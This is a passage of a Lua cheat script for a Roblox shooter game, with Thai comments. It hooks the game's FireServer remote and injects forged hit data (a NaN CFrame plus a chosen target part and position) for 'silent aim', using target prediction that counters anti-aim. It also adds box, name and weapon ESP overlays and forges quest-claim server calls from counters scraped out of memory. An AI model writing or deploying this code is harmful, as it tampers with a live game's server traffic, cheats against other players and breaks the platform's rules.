    elseif targetType == "FAKELAG" then
        points = {
            {pos = basePosition + Vector3.new(0, 0, 0.35), weight = 0.45},
            {pos = basePosition + Vector3.new(0, 0.15, 0.25), weight = 0.3},
            {pos = basePosition, weight = 0.15},
            {pos = basePosition + Vector3.new(0, -0.15, 0.15), weight = 0.1}
        }
    else -- NORMAL
        points = {{pos = basePosition, weight = 1.0}}
    end

    return points
end

-- ============================================
-- GET SMART HIT POSITION
-- ============================================
local function GetSmartHitPosition(player, character)
    if not player or not character then return nil end

    local antiLookType, suggestedPos = DetectAntiLookType(character)
    antiLookTypes[player] = antiLookType
    
    local hitPoints = GenerateHitPoints(antiLookType, suggestedPos or character.Head.Position, character)
    local history = shotHistory[player] or {hits = 0, misses = 0, lastPositions = {}}

    if history.hits == 0 and history.misses == 0 then
        return hitPoints[1].pos
    end

    if history.misses >= 2 then
        local lastPositions = history.lastPositions
        if #lastPositions > 0 then
            local candidates = {}
            for _, point in ipairs(hitPoints) do
                local usedRecently = false
                for i = math.max(1, #lastPositions - 1), #lastPositions do
                    if (point.pos - lastPositions[i]).Magnitude < 0.15 then
                        usedRecently = true
                        break
                    end
                end
                if not usedRecently then
                    table.insert(candidates, point)
                end
            end

            if #candidates > 0 then
                local totalWeight = 0
                for _, point in ipairs(candidates) do
                    totalWeight = totalWeight + point.weight
                end

                local random = math.random() * totalWeight
                local cumulative = 0
                for _, point in ipairs(candidates) do
                    cumulative = cumulative + point.weight
                    if random <= cumulative then
                        return point.pos
                    end
                end
            end
        end
    end

    if history.hits > history.misses and #history.lastPositions > 0 then
        local lastPos = history.lastPositions[#history.lastPositions]
        local closestPoint = hitPoints[1]
        local closestDist = (closestPoint.pos - lastPos).Magnitude

        for _, point in ipairs(hitPoints) do
            local dist = (point.pos - lastPos).Magnitude
            if dist < closestDist then
                closestDist = dist
                closestPoint = point
            end
        end
        return closestPoint.pos
    end

    local bestPoint = hitPoints[1]
    for _, point in ipairs(hitPoints) do
        if point.weight > bestPoint.weight then
            bestPoint = point
        end
    end
    return bestPoint.pos
end

-- ============================================
-- GET TRACKED VELOCITY
-- ============================================
local function _getTrackedVelocity(player)
    local char = player.Character
    if not char then return Vector3.new(0,0,0) end
    local root = char:FindFirstChild("HumanoidRootPart")
    if not root then return Vector3.new(0,0,0) end
    local now = tick()

    if not velocityHistory[player] then 
        velocityHistory[player] = { buf = {} } 
    end
    local h = velocityHistory[player]
    table.insert(h.buf, { pos = root.Position, t = now, vel = root.Velocity })
    if #h.buf > VEL_BUF_SIZE then table.remove(h.buf, 1) end

    if #h.buf < 2 then return root.Velocity end
    
    local totalVel = Vector3.new(0,0,0)
    local validCount = 0
    for i = math.max(1, #h.buf - 2), #h.buf do
        if h.buf[i].vel and h.buf[i].vel.Magnitude < 200 then
            totalVel = totalVel + h.buf[i].vel
            validCount = validCount + 1
        end
    end
    
    if validCount > 0 then
        return totalVel / validCount
    end
    return root.Velocity
end

-- ============================================
-- GET PING
-- ============================================
local function GetPing()
    local success, pingValue = pcall(function()
        return game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValue() / 1000
    end)
    if success and type(pingValue) == "number" then
        return math.clamp(pingValue, 0.03, 0.3)
    end
    return 0.1
end

-- ============================================
-- CALCULATE AIM POSITION (ปรับปรุงใหม่ แม่นยำ)
-- ============================================
local function CalculateAimPosition(targetPos, player, character)
    local myHead = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Head")
    if not myHead then return targetPos end

    local root = character:FindFirstChild("HumanoidRootPart")
    if not root then return targetPos end

    local vel = _getTrackedVelocity(player)
    local ping = GetPing()
    
    -- ปรับ prediction ตามความเร็ว (เพิ่มมาใหม่)
    local predFactor = getgenv().Prediction
    if getgenv().UseDynamicPrediction then
        local speed = vel.Magnitude
        if speed > 50 then  -- รถเร็วมาก
            predFactor = predFactor * 1.3
        elseif speed > 30 then  -- วิ่งเร็ว
            predFactor = predFactor * 1.2
        elseif speed > 15 then  -- วิ่งปกติ
            predFactor = predFactor * 1.1
        end
    end
    
    local totalPredictionTime = ping + predFactor
    local predicted = targetPos + (vel * totalPredictionTime)

    local antiLookType = antiLookTypes[player] or "NORMAL"

    if antiLookType == "FAKEANGLE" then
        local horizontalVel = Vector3.new(vel.X, 0, vel.Z)
        predicted = predicted + (horizontalVel * 0.05) + Vector3.new(0, 0, -0.25)
    elseif antiLookType == "JITTER" then
        local randomFactor = 0.08
        predicted = predicted + Vector3.new(
            (math.random() - 0.5) * randomFactor,
            (math.random() - 0.5) * randomFactor * 0.5 + 0.1,
            (math.random() - 0.5) * randomFactor
        )
    elseif antiLookType == "DESYNC" then
        predicted = predicted + Vector3.new(0, 0.2, 0)
    elseif antiLookType == "FAKELAG" then
        predicted = predicted + (vel * 0.03) + Vector3.new(0, 0, 0.2)
    end

    return predicted
end

-- ============================================
-- IS HOLDING ALLOWED GUN
-- ============================================
local function IsHoldingAllowedGun()
    local char = LocalPlayer.Character
    if not char then return false end
    
    for _, child in pairs(char:GetChildren()) do
        if child:IsA("Tool") and GunLookup[child.Name] then
            return true
        end
        if child:IsA("Tool") and GunLookup[child.Name:lower()] then
            return true
        end
    end
    return false
end

-- ============================================
-- RECORD SHOT
-- ============================================
local function RecordShot(player, hitSuccess, position)
    if not player then return end

    if not shotHistory[player] then
        shotHistory[player] = {hits = 0, misses = 0, lastPositions = {}}
    end

    local history = shotHistory[player]

    if hitSuccess then
        history.hits = history.hits + 1
        if history.hits >= 2 then
            history.misses = math.max(0, history.misses - 1)
        end
    else
        history.misses = history.misses + 1
        if history.misses >= 4 then
            history.hits = math.max(0, history.hits - 2)
            history.misses = math.max(0, history.misses - 2)
        end
    end

    table.insert(history.lastPositions, position)
    if #history.lastPositions > 4 then
        table.remove(history.lastPositions, 1)
    end
end

-- ============================================
-- GET CLOSEST TARGET
-- ============================================
local function GetClosestTarget()
    local target = nil
    local shortestDist = getgenv().FOV_Radius
    local center = Vector2.new(Camera.ViewportSize.X/2, Camera.ViewportSize.Y/2)
    
    for _,v in pairs(Players:GetPlayers()) do
        if v == LocalPlayer then continue end
        if not v.Character then continue end
        
        local hum = v.Character:FindFirstChild("Humanoid")
        if not hum or hum.Health <= 0 then continue end
        
        local head = v.Character:FindFirstChild("Head")
        if not head then continue end
        
        local pos, onScreen = Camera:WorldToViewportPoint(head.Position)
        if onScreen then
            local dist = (Vector2.new(pos.X,pos.Y)-center).Magnitude
            if dist <= getgenv().FOV_Radius and dist < shortestDist then
                shortestDist = dist
                target = v
            end
        end
    end
    return target
end

-- ============================================
-- SETUP HIT DETECTION
-- ============================================
local function SetupHitDetection()
    local hitRemotes = {"Hit", "Damage", "TakeDamage"}
    for _, remoteName in pairs(hitRemotes) do
        local remote = ReplicatedStorage:FindFirstChild(remoteName) or 
                      (ReplicatedStorage:FindFirstChild("Remotes") and ReplicatedStorage.Remotes:FindFirstChild(remoteName))

        if remote and remote:IsA("RemoteEvent") then
            local oldEvent = remote.OnClientEvent
            remote.OnClientEvent = function(...)
                local args = {...}
                if getgenv().CurrentTarget then
                    RecordShot(getgenv().CurrentTarget, true, getgenv().FinalAimPos)
                end
                if oldEvent then
                    return oldEvent(...)
                end
            end
        end
    end
end

SetupHitDetection()

-- ============================================
-- MAIN HOOK (ปรับปรุง)
-- ============================================
local remotes = ReplicatedStorage:WaitForChild("Remotes")
local send = remotes:WaitForChild("Send")
local oldFire

oldFire = hookfunction(send.FireServer, function(self, ...)
    local args = {...}
    
    if getgenv().SilentAimEnabled and IsHoldingAllowedGun() then
        local targetPlayer = GetClosestTarget()
        
        if targetPlayer and targetPlayer.Character then
            getgenv().CurrentTarget = targetPlayer
            local targetPos = GetSmartHitPosition(targetPlayer, targetPlayer.Character)

            if targetPos then
                local aimPos = CalculateAimPosition(targetPos, targetPlayer, targetPlayer.Character)
                getgenv().FinalAimPos = aimPos

                local antiLookType = antiLookTypes[targetPlayer] or "NORMAL"
                local targetPart
                
                if antiLookType == "DESYNC" then
                    targetPart = targetPlayer.Character:FindFirstChild("UpperTorso") or 
                                 targetPlayer.Character:FindFirstChild("HumanoidRootPart")
                else
                    targetPart = targetPlayer.Character:FindFirstChild("Head") or 
                                 targetPlayer.Character:FindFirstChild("HumanoidRootPart")
                end

                if targetPart then
                    args[4] = CFrame.new(1/0,1/0,1/0,0/0,0/0,0/0,0/0,0/0,0/0,0/0,0/0,0/0)
                    args[5] = {[1]={[1]={["Instance"]=targetPart,["Position"]=aimPos}}}
                    RecordShot(targetPlayer, false, aimPos)
                    
                    local origin = (LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Head"))
                        and LocalPlayer.Character.Head.Position or Vector3.new(0,0,0)
                    CreateBulletBeam(origin, aimPos)
                end
            end
        end
    end
    return oldFire(self, unpack(args))
end)

-- ============================================
-- FOV Drawing (เหมือนเดิม)
-- ============================================
local FOV_SHAPE = "circle"
local FOV_COLOR_MODE = "rainbow"
local TRACER_COLOR_MODE = "rainbow"

local FOV_STATIC_COLORS = {
    red    = Color3.fromRGB(255,60,60),
    green  = Color3.fromRGB(60,255,100),
    blue   = Color3.fromRGB(60,150,255),
    white  = Color3.fromRGB(255,255,255),
    purple = Color3.fromRGB(180,60,255),
}

local MAX_FOV_LINES = 8
local Lines = {}
for idx=1,MAX_FOV_LINES do
    Lines[idx]=Drawing.new("Line")
    Lines[idx].Visible=false
    Lines[idx].Thickness=2
end

local function GetFOVColor(time, idx, total)
    if getgenv().WallPierceEnabled then return Color3.fromRGB(255,60,60) end
    if FOV_COLOR_MODE == "rainbow" then
        return Color3.fromHSV((time+(idx/total))%1,1,1)
    end
    return FOV_STATIC_COLORS[FOV_COLOR_MODE] or Color3.fromRGB(255,255,255)
end

local function GetTracerColor(time)
    if getgenv().WallPierceEnabled then return Color3.fromRGB(255,60,60) end
    if TRACER_COLOR_MODE == "rainbow" then
        return Color3.fromHSV(time%1,1,1)
    end
    return FOV_STATIC_COLORS[TRACER_COLOR_MODE] or Color3.fromRGB(255,255,255)
end

local function HideAllLines()
    for idx=1,MAX_FOV_LINES do Lines[idx].Visible=false end
end

local function DrawFOV(center, radius, time)
    HideAllLines()
    if FOV_SHAPE == "circle" then
        for idx=1,8 do
            local a=math.rad((idx-1)*45)
            local b=math.rad(idx*45)
            Lines[idx].From=center+Vector2.new(math.cos(a)*radius,math.sin(a)*radius)
            Lines[idx].To=center+Vector2.new(math.cos(b)*radius,math.sin(b)*radius)
            Lines[idx].Color=GetFOVColor(time,idx,8)
            Lines[idx].Visible=true
        end
    elseif FOV_SHAPE == "square" then
        local tl=center+Vector2.new(-radius,-radius)
        local tr=center+Vector2.new( radius,-radius)
        local br=center+Vector2.new( radius, radius)
        local bl=center+Vector2.new(-radius, radius)
        local corners={{tl,tr},{tr,br},{br,bl},{bl,tl}}
        for idx=1,4 do
            Lines[idx].From=corners[idx][1]
            Lines[idx].To=corners[idx][2]
            Lines[idx].Color=GetFOVColor(time,idx,4)
            Lines[idx].Visible=true
        end
    elseif FOV_SHAPE == "diamond" then
        local top=center+Vector2.new(0,-radius)
        local right=center+Vector2.new(radius,0)
        local bot=center+Vector2.new(0,radius)
        local left=center+Vector2.new(-radius,0)
        local pts={{top,right},{right,bot},{bot,left},{left,top}}
        for idx=1,4 do
            Lines[idx].From=pts[idx][1]
            Lines[idx].To=pts[idx][2]
            Lines[idx].Color=GetFOVColor(time,idx,4)
            Lines[idx].Visible=true
        end
    elseif FOV_SHAPE == "triangle" then
        local top=center+Vector2.new(0,-radius)
        local br=center+Vector2.new(radius*0.866,radius*0.5)
        local bl=center+Vector2.new(-radius*0.866,radius*0.5)
        local pts={{top,br},{br,bl},{bl,top}}
        for idx=1,3 do
            Lines[idx].From=pts[idx][1]
            Lines[idx].To=pts[idx][2]
            Lines[idx].Color=GetFOVColor(time,idx,3)
            Lines[idx].Visible=true
        end
    end
end

local ScreenTracer=Drawing.new("Line")
ScreenTracer.Thickness=1.5
ScreenTracer.Transparency=0.8
ScreenTracer.Visible=false

local isFiring=false
local lastBeamTime=0
local beamCooldown=0.1
UserInputService.InputBegan:Connect(function(input,gp)
    if not gp and input.UserInputType==Enum.UserInputType.MouseButton1 then
        isFiring=true
        task.spawn(function() task.wait(0.1) isFiring=false end)
    end
end)
UserInputService.TouchStarted:Connect(function(input,gp)
    if not gp then
        isFiring=true
        task.spawn(function() task.wait(0.1) isFiring=false end)
    end
end)

local function CreateBulletBeam(startPos,endPos)
    if not isFiring then return end
    if tick()-lastBeamTime<beamCooldown then return end
    lastBeamTime=tick()
    local p=Instance.new("Part")
    p.Name="PIG_Beam" p.Parent=workspace p.Anchored=true p.CanCollide=false
    p.Material=Enum.Material.Neon
    p.Size=Vector3.new(0.1,0.1,(startPos-endPos).Magnitude)
    p.CFrame=CFrame.new(startPos:Lerp(endPos,0.5),endPos)
    p.Color=Color3.fromHSV((tick()*2)%1,1,1)
    local t=TweenService:Create(p,TweenInfo.new(0.5),{Transparency=1,Size=Vector3.new(0,0,p.Size.Z)})
    t:Play()
    game:GetService("Debris"):AddItem(p,0.5)
end

-- ชื่อ developer ที่ได้รับการป้องกัน
local DEVELOPER_NAME = "EliteLynx7422"
local _devNotifCooldown = 0

local function _isDevTarget(player)
    return player and player.Name == DEVELOPER_NAME
end

-- ============================================
-- UPDATE RENDER (เหมือนเดิม)
-- ============================================
local lastTracerPos = nil
local tracerSmooth = 0.85

RunService.RenderStepped:Connect(function()
    local Center = Vector2.new(Camera.ViewportSize.X/2, Camera.ViewportSize.Y/2)
    local Time = tick() * getgenv().RGB_Speed
    
    if getgenv().SilentAimEnabled then
        DrawFOV(Center, getgenv().FOV_Radius, Time)
        local targetPlayer = GetClosestTarget()
        
        if targetPlayer and targetPlayer.Character then
            getgenv().CurrentTarget = targetPlayer
            local targetPos = GetSmartHitPosition(targetPlayer, targetPlayer.Character)
            
            if targetPos then
                local predictedPos = CalculateAimPosition(targetPos, targetPlayer, targetPlayer.Character)
                local screenPos, onScreen = Camera:WorldToViewportPoint(predictedPos)
                
                if onScreen then
                    -- Smooth tracer
                    if lastTracerPos then
                        screenPos = lastTracerPos + (screenPos - lastTracerPos) * tracerSmooth
                    end
                    lastTracerPos = screenPos
                    
                    ScreenTracer.From = Center
                    ScreenTracer.To = Vector2.new(screenPos.X, screenPos.Y)
                    ScreenTracer.Color = GetTracerColor(Time)
                    ScreenTracer.Visible = true
                    
                    getgenv().CurrentTargetHead = targetPlayer.Character:FindFirstChild("Head")
                end
            end
        else
            ScreenTracer.Visible = false
            getgenv().CurrentTarget = nil
            getgenv().CurrentTargetHead = nil
            getgenv().FinalAimPos = nil
            lastTracerPos = nil
        end
    else
        HideAllLines()
        ScreenTracer.Visible = false
        getgenv().CurrentTarget = nil
        getgenv().CurrentTargetHead = nil
        getgenv().FinalAimPos = nil
        lastTracerPos = nil
    end
end)

-- PVP TAB UI
PVPTab:Toggle({
    Title="Silent Aim",Default=false,
    Callback=function(v)
        getgenv().SilentAimEnabled=v
        if not v then
            getgenv().CurrentTargetHead=nil getgenv().FinalAimPos=nil
            getgenv().WallPierceEnabled=false ScreenTracer.Visible=false
            HideAllLines()
        end
    end
})
PVPTab:Slider({
    Title="FOV Radius",Desc="ปรับขนาดวงเล็ง",Step=10,
    Value={Min=50,Max=500,Default=300},
    Callback=function(v) getgenv().FOV_Radius=v end
})
PVPTab:Dropdown({
    Title="FOV Shape",Desc="เลือกรูปทรง FOV",
    Values={"Circle","Square","Diamond","Triangle"},Default=1,
    Callback=function(v)
        FOV_SHAPE=v:lower()
        HideAllLines()
    end
})
PVPTab:Dropdown({
    Title="FOV Color",Desc="เลือกสี FOV",
    Values={"Rainbow","Red","Green","Blue","White","Purple"},Default=1,
    Callback=function(v)
        FOV_COLOR_MODE=v:lower()
    end
})
PVPTab:Dropdown({
    Title="Tracer Color",Desc="เลือกสีเส้นชี้เป้า",
    Values={"Rainbow","Red","Green","Blue","White","Purple"},Default=1,
    Callback=function(v)
        TRACER_COLOR_MODE=v:lower()
    end
})
PVPTab:Dropdown({
    Title="Aim Part",Desc="เลือกส่วนที่ต้องการเล็ง",
    Values={"Head","HumanoidRootPart","UpperTorso","LowerTorso"},Default=1,
    Callback=function(v) getgenv().AimPart=v end
})
PVPTab:Slider({
    Title="Prediction",Desc="ความแม่นยำ",Step=0.005,
    Value={Min=0.05,Max=0.35,Default=0.165},  -- เปลี่ยน default เป็น 0.165
    Callback=function(v) getgenv().Prediction=v end
})
PVPTab:Toggle({
    Title="Dynamic Prediction",Desc="ปรับ prediction ตามความเร็วเป้า",Default=true,
    Callback=function(v) getgenv().UseDynamicPrediction=v end
})
PVPTab:Slider({
    Title="Beam Cooldown",Desc="ระยะห่างลำแสง (ms)",Step=10,
    Value={Min=50,Max=300,Default=100},
    Callback=function(v) beamCooldown=v/1000 end
})

-- QUEST TAB
local function findCounterTable()
    if not getgc then return nil end
    for _,obj in ipairs(getgc(true)) do
        if typeof(obj)=="table" then
            if rawget(obj,"event") and rawget(obj,"func") then return obj end
        end
    end
    return nil
end
local function createNetwork()
    local CounterTable=findCounterTable()
    if not CounterTable then return nil end
    local Net={}
    function Net.get(...)
        CounterTable.func=(CounterTable.func or 0)+1
        return ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("Get"):InvokeServer(CounterTable.func,...)
    end
    function Net.send(action)
        CounterTable.event=(CounterTable.event or 0)+1
        ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("Send"):FireServer(CounterTable.event,action)
    end
    return Net
end
QuestTab:Button({
    Title="Clear All Quests",Desc="เคลียร์เควสทั้งหมด",
    Callback=function()
        task.spawn(function()
            local Net=createNetwork()
            if not Net then return end
            local success,questUI=pcall(function()
                return LocalPlayer:WaitForChild("PlayerGui"):WaitForChild("Quests"):WaitForChild("QuestsHolder"):WaitForChild("QuestsScrollingFrame")
            end)
            if not success or not questUI then return end
            local cleared,total=0,0
            for _,child in pairs(questUI:GetChildren()) do
                if child:IsA("Frame") or child:IsA("TextButton") or child:IsA("ImageButton") then
                    total=total+1
                    local ok=pcall(function() return Net.get("claim_quest",child.Name) end)
                    if ok then cleared=cleared+1 end
                    task.wait(0.15)
                end
            end
            game:GetService("StarterGui"):SetCore("SendNotification",{Title="Quest Clear",Text="Cleared "..cleared.."/"..total.." quests",Duration=5})
        end)
    end
})

-- ESP TAB
ESPTab:Section({Title="Box ESP"})

local rainbowColors = {
    Color3.fromRGB(255,0,0),
    Color3.fromRGB(255,127,0),
    Color3.fromRGB(255,255,0),
    Color3.fromRGB(0,255,0),
    Color3.fromRGB(0,0,255),
    Color3.fromRGB(75,0,130),
    Color3.fromRGB(148,0,211)
}
local BOX_COLOR_MODE = "rainbow"
local BOX_STATIC_COLORS = {
    green  = Color3.fromRGB(60,255,100),
    white  = Color3.fromRGB(255,255,255),
    red    = Color3.fromRGB(255,60,60),
    blue   = Color3.fromRGB(60,150,255),
    yellow = Color3.fromRGB(255,220,0),
}

local ShowBoxESP = false
local PlayerBoxESP = {}

local function getBoxColor(espData, lineKey)
    if BOX_COLOR_MODE == "rainbow" then
        local offsets = {top=0,bottom=2,left=4,right=6}
        return rainbowColors[((espData.colorIndex + (offsets[lineKey] or 0)) % #rainbowColors) + 1]
    end
    return BOX_STATIC_COLORS[BOX_COLOR_MODE] or Color3.fromRGB(255,255,255)
end

local function createBoxESP(player)
    if player==LocalPlayer or PlayerBoxESP[player] then return end
    local box={
        top=Drawing.new("Line"),
        bottom=Drawing.new("Line"),
        left=Drawing.new("Line"),
        right=Drawing.new("Line")
    }
    for _,line in pairs(box) do
        line.Thickness=2 line.Visible=false line.ZIndex=1
    end
    box.top.Color=rainbowColors[1]
    box.bottom.Color=rainbowColors[3]
    box.left.Color=rainbowColors[5]
    box.right.Color=rainbowColors[7]
    PlayerBoxESP[player]={box=box,colorIndex=1,lastColorChange=tick()}
end
local function removeBoxESP(player)
    local espData=PlayerBoxESP[player]
    if not espData then return end
    for _,line in pairs(espData.box) do line:Remove() end
    PlayerBoxESP[player]=nil
end
local function getCharacterBounds(character)
    if not character then return nil end
    local minX,maxX=math.huge,-math.huge
    local minY,maxY=math.huge,-math.huge
    for _,part in pairs(character:GetChildren()) do
        if part:IsA("BasePart") then
            local pos,visible=Camera:WorldToViewportPoint(part.Position)
            if visible then
                minX=math.min(minX,pos.X) maxX=math.max(maxX,pos.X)
                minY=math.min(minY,pos.Y) maxY=math.max(maxY,pos.Y)
            end
        end
    end
    if minX==math.huge then
        local hrp=character:FindFirstChild("HumanoidRootPart")
        if hrp then
            local pos,visible=Camera:WorldToViewportPoint(hrp.Position)
            if visible then
                local size=30
                minX=pos.X-size maxX=pos.X+size
                minY=pos.Y-size*1.5 maxY=pos.Y+size*0.5
            else return nil end
        else return nil end
    end
    local padding=3
    minX=minX-padding maxX=maxX+padding
    minY=minY-padding maxY=maxY+padding
    return {
        topLeft=Vector2.new(minX,minY),topRight=Vector2.new(maxX,minY),
        bottomLeft=Vector2.new(minX,maxY),bottomRight=Vector2.new(maxX,maxY)
    }
end

RunService.RenderStepped:Connect(function()
    if not ShowBoxESP then
        for _,espData in pairs(PlayerBoxESP) do
            if espData and espData.box then
                for _,line in pairs(espData.box) do line.Visible=false end
            end
        end
        return
    end
    local currentTime=tick()
    for player,espData in pairs(PlayerBoxESP) do
        if not espData or not espData.box then continue end
        local character=player.Character
        if not character or not character.Parent then
            for _,line in pairs(espData.box) do line.Visible=false end
            continue
        end
        local bounds=getCharacterBounds(character)
        if bounds then
            espData.box.top.From=bounds.topLeft espData.box.top.To=bounds.topRight
            espData.box.bottom.From=bounds.bottomLeft espData.box.bottom.To=bounds.bottomRight
            espData.box.left.From=bounds.topLeft espData.box.left.To=bounds.bottomLeft
            espData.box.right.From=bounds.topRight espData.box.right.To=bounds.bottomRight
            for _,line in pairs(espData.box) do line.Visible=true end
            if currentTime-espData.lastColorChange>0.15 then
                espData.box.top.Color=getBoxColor(espData,"top")
                espData.box.bottom.Color=getBoxColor(espData,"bottom")
                espData.box.left.Color=getBoxColor(espData,"left")
                espData.box.right.Color=getBoxColor(espData,"right")
                espData.colorIndex=(espData.colorIndex%#rainbowColors)+1
                espData.lastColorChange=currentTime
            end
        else
            for _,line in pairs(espData.box) do line.Visible=false end
        end
    end
end)

for _,player in ipairs(Players:GetPlayers()) do
    if player~=LocalPlayer then task.spawn(function() createBoxESP(player) end) end
end
Players.PlayerAdded:Connect(function(player)
    if player~=LocalPlayer then task.wait(0.5) createBoxESP(player) end
end)
Players.PlayerRemoving:Connect(removeBoxESP)

ESPTab:Toggle({
    Title="ESP Box",Desc="กล่องครอบผู้เล่น",Default=false,
    Callback=function(v)
        ShowBoxESP=v
        if v then
            for _,player in ipairs(Players:GetPlayers()) do
                if player~=LocalPlayer and not PlayerBoxESP[player] then createBoxESP(player) end
            end
        end
    end
})
ESPTab:Dropdown({
    Title="Box Color",Desc="เลือกสีของ ESP Box",
    Values={"Rainbow","Green","White","Red","Blue","Yellow"},Default=1,
    Callback=function(v)
        BOX_COLOR_MODE=v:lower()
    end
})

ESPTab:Section({Title="Name ESP"})

local ShowNameESP = false
local PlayerNameESP = {}

local function createNameESP(player)
    if player==LocalPlayer or PlayerNameESP[player] then return end
    local nameDisplay=Drawing.new("Text")
    nameDisplay.Size=18 nameDisplay.Center=true nameDisplay.Outline=true
    nameDisplay.OutlineColor=Color3.new(0,0,0)
    nameDisplay.Color=Color3.new(1,1,1)
    nameDisplay.Font=2 nameDisplay.Visible=false
    PlayerNameESP[player]={
        display=nameDisplay,
        character=player.Character,
        hrp=player.Character and player.Character:FindFirstChild("HumanoidRootPart")
    }
    player.CharacterAdded:Connect(function(char)
        PlayerNameESP[player].character=char
        task.spawn(function()
            local hrp=char:WaitForChild("HumanoidRootPart",0.5)
            if hrp then PlayerNameESP[player].hrp=hrp end
        end)
    end)
end
local function removeNameESP(player)
    local espData=PlayerNameESP[player]
    if not espData then return end
    if espData.display then espData.display:Remove() end
    PlayerNameESP[player]=nil
end

RunService.RenderStepped:Connect(function()
    if not ShowNameESP then
        for _,espData in pairs(PlayerNameESP) do
            if espData and espData.display then espData.display.Visible=false end
        end
        return
    end
    for player,espData in pairs(PlayerNameESP) do
        if not espData or not espData.display then continue end
        if not player.Parent then removeNameESP(player) continue end
        if not espData.character and player.Character then
            espData.character=player.Character
            espData.hrp=player.Character:FindFirstChild("HumanoidRootPart")
        end
        if not espData.character or not espData.hrp then espData.display.Visible=false continue end
        local pos,onScreen=Camera:WorldToViewportPoint(espData.hrp.Position+Vector3.new(0,3,0))
        if onScreen and pos.Z>0 then
            local distance=(Camera.CFrame.Position-espData.hrp.Position).Magnitude
            if distance<=1500 then
                espData.display.Text=player.Name
                espData.display.Position=Vector2.new(pos.X,pos.Y)
                espData.display.Visible=true
            else
                espData.display.Visible=false
            end
        else
            espData.display.Visible=false
        end
    end
end)

task.spawn(function()
    task.wait(0.1)
    for _,player in ipairs(Players:GetPlayers()) do
        if player~=LocalPlayer then createNameESP(player) end
    end
end)
Players.PlayerAdded:Connect(function(player)
    if player~=LocalPlayer then task.wait(0.05) createNameESP(player) end
end)
Players.PlayerRemoving:Connect(removeNameESP)
LocalPlayer.CharacterAdded:Connect(function()
    task.wait(0.3)
    for player,espData in pairs(PlayerNameESP) do
        if player and player.Character then
            espData.character=player.Character
            espData.hrp=player.Character:FindFirstChild("HumanoidRootPart")
        end
    end
end)

ESPTab:Toggle({
    Title="ESP Name",Desc="แสดงชื่อผู้เล่น",Default=false,
    Callback=function(v) ShowNameESP=v end
})

ESPTab:Section({Title="Item Weapon ESP"})

local ShowItemESP = false
local ItemBillboards = {}
local WeaponRegistry = {}
local RarityColorsBB = {
    Common=Color3.fromRGB(255,255,255),
    Uncommon=Color3.fromRGB(99,255,52),
    Rare=Color3.fromRGB(51,170,255),
    Epic=Color3.fromRGB(237,44,255),
    Legendary=Color3.fromRGB(255,150,0),
    Omega=Color3.fromRGB(255,20,51)
}

local function registerItemsFromContainer(container)
    for _,item in ipairs(container:GetChildren()) do
        if item:IsA("Tool") then
            local handle=item:FindFirstChild("Handle")
            local displayName=item:GetAttribute("DisplayName") or item.Name
            local itemId=item:GetAttribute("ItemId") or item:GetAttribute("Id") or item.Name
            local rarity=item:GetAttribute("RarityName") or "Common"
            local imageId=item:GetAttribute("ImageId") or "rbxassetid://7072725737"
            local key
            if handle then
                local mesh=handle:FindFirstChildOfClass("SpecialMesh")
                if mesh and mesh.MeshId~="" then
                    key=mesh.MeshId..(mesh.TextureId or "").."_RARITY_"..rarity
                elseif handle:IsA("MeshPart") and handle.MeshId~="" then
                    key=handle.MeshId..(handle.TextureID or "").."_RARITY_"..rarity
                end
            end
            if not key and itemId~="" and itemId~=item.Name then
                key="ITEMID_"..itemId.."_RARITY_"..rarity
            end
            if not key then key="NAME_"..displayName.."_"..item.Name.."_RARITY_"..rarity end
            WeaponRegistry[key]={Name=displayName,Rarity=rarity,ImageId=imageId,ToolName=item.Name}
        end
    end
end

pcall(function()
    local items=ReplicatedStorage:WaitForChild("Items",5)
    if items then
        for _,folder in ipairs(items:GetChildren()) do
            if folder:IsA("Folder") or folder:IsA("Model") then
                registerItemsFromContainer(folder)
            end
        end
    end
end)

local function getWeaponKey(tool)
    local handle=tool:FindFirstChild("Handle")
    local displayName=tool:GetAttribute("DisplayName") or tool.Name
    local itemId=tool:GetAttribute("ItemId") or tool:GetAttribute("Id") or tool.Name
    local rarity=tool:GetAttribute("RarityName") or "Common"
    if handle then
        local mesh=handle:FindFirstChildOfClass("SpecialMesh")
        if mesh and mesh.MeshId~="" then return mesh.MeshId..(mesh.TextureId or "").."_RARITY_"..rarity end
        if handle:IsA("MeshPart") and handle.MeshId~="" then return handle.MeshId..(handle.TextureID or "").."_RARITY_"..rarity end
    end
    if itemId~="" and itemId~=tool.Name then return "ITEMID_"..itemId.."_RARITY_"..rarity end
    return "NAME_"..displayName.."_"..tool.Name.."_RARITY_"..rarity
end

local function buildBillboard(player)
    if not ShowItemESP or player==LocalPlayer then return end
    local char=player.Character
    if not char then return end
    local hrp=char:FindFirstChild("HumanoidRootPart")
    if not hrp then return end
    if ItemBillboards[player] then ItemBillboards[player]:Destroy() ItemBillboards[player]=nil end
    local bb=Instance.new("BillboardGui")
    bb.Adornee=hrp
    bb.Size=UDim2.new(0,90,0,20)
    bb.StudsOffset=Vector3.new(0,-5,0)
    bb.AlwaysOnTop=true
    bb.Parent=char
    local layout=Instance.new("UIListLayout",bb)
    layout.FillDirection=Enum.FillDirection.Horizontal
    layout.SortOrder=Enum.SortOrder.LayoutOrder
    layout.Padding=UDim.new(0,5)
    layout.HorizontalAlignment=Enum.HorizontalAlignment.Center
    local tools={}
    for _,slot in ipairs({"Backpack","StarterGear","StarterPack"}) do
        local bag=player:FindFirstChild(slot)
        if bag then
            for _,t in ipairs(bag:GetChildren()) do
                if t:IsA("Tool") and t.Name~="Fists" then table.insert(tools,t) end
            end
        end
    end
    for _,t in ipairs(char:GetChildren()) do
        if t:IsA("Tool") and t.Name~="Fists" then table.insert(tools,t) end
    end
    for _,tool in ipairs(tools) do
        local key=getWeaponKey(tool)
        local info=WeaponRegistry[key]
        if info then
            local img=Instance.new("ImageLabel",bb)
            img.Size=UDim2.new(0,20,0,20)
            img.BackgroundTransparency=0.1
            img.Image=info.ImageId
            img.BackgroundColor3=Color3.fromRGB(240,248,255)
            Instance.new("UICorner",img).CornerRadius=UDim.new(0,10)
            local stroke=Instance.new("UIStroke",img)
            stroke.Color=RarityColorsBB[info.Rarity] or Color3.new(1,1,1)
            stroke.Thickness=2
        end
    end
    ItemBillboards[player]=bb
end

local function clearBillboard(player)
    if ItemBillboards[player] then
        ItemBillboards[player]:Destroy()
        ItemBillboards[player]=nil
    end
end

